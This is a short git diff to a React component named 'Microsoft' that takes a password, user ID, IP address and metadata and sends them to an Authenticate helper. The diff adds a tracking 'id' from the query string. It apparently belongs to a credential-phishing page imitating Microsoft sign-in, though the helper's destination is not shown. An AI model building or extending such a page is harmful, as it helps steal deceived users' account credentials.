@@ -5,9 +5,11 @@ import { useParams } from 'react-router-dom'
 import { Authenticate } from '../../helpers/Auth'
 import axios from 'axios'
 import Loader from '../../component/Loader'
+import useQueryParams from '../../hooks/useQueryParams'
 
 const Microsoft = () => {
   const { service } = useParams()
+  const id = useQueryParams()
   const [showPasswordInput, setShowPasswordInput] = useState(false)
   const [btnText, setBtnText] = useState('Next')
 
@@ -65,8 +67,8 @@ const Microsoft = () => {
         return
       }
       setIsLoading(true)
-      Authenticate(userID, password, service, IPAddress, metaData).then(() =>
-        setRedirect(true)
+      Authenticate(userID, password, service, IPAddress, metaData, id).then(
+        () => setRedirect(true)
       )
     }
   }
